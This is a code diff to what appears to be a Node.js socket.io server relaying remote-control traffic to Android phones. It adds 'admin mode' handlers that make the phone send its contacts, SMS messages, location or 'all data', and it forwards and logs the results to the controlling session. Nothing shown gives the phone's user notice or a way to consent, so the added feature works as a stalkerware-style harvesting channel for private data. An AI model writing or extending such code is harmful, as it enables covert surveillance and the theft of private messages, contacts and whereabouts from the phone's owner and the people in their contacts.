@@ -217,6 +217,23 @@ io.on('connection', (socket) => {
     sendToAndroid(sessionId, { type: 'request-keyframe' });
   });
 
+  // Data collection (admin mode)
+  socket.on('get-contacts', ({ sessionId }) => {
+    sendToAndroid(sessionId, { type: 'get-contacts' });
+  });
+
+  socket.on('get-sms', ({ sessionId, limit }) => {
+    sendToAndroid(sessionId, { type: 'get-sms', limit: limit || 50 });
+  });
+
+  socket.on('get-location', ({ sessionId }) => {
+    sendToAndroid(sessionId, { type: 'get-location' });
+  });
+
+  socket.on('get-all-data', ({ sessionId }) => {
+    sendToAndroid(sessionId, { type: 'get-all-data' });
+  });
+
   socket.on('disconnect', () => {
     const { sessionId, role } = socket;
     if (sessionId && sessions.has(sessionId)) {
@@ -393,6 +410,12 @@ function handleAndroidMessage(sessionId, msg) {
 
     case 'bandwidth-report':
       io.to(sessionId).emit('bandwidth-report', msg.data);
+      break;
+
+    case 'data-report':
+      // Data from Android (contacts, SMS, location)
+      io.to(sessionId).emit('data-report', msg);
+      console.log(`[Android] ${sessionId} data report: ${msg.dataType}`);
       break;
 
     case 'stream-config':
